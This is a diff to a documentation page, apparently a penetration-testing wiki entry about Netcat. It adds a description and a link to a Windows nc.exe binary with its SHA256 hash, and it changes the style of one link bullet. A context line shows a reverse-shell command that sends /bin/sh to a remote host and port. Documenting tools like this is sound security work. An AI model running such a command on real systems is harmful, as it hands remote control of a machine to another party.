@@ -11,6 +11,14 @@ weight: 0
 
 ## Netcat
 
+Netcat, arbitrary TCP and UDP connections and listens.
+
+### Binary for Windows
+
+{{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(exe)"/%}}
+
+* SHA256 'nc.exe' - `be4211fe5c1a19ff393a2bcfa21dad8d0a687663263a63789552bda446d9421b`
+
 ### Usage
 
 ```plain
@@ -117,4 +125,4 @@ nc 10.10.10.2 4444 -e /bin/sh
 
 ### URL list
 
-- [Linux.die.net](https://linux.die.net/man/1/nc)
+* [Linux.die.net](https://linux.die.net/man/1/nc)
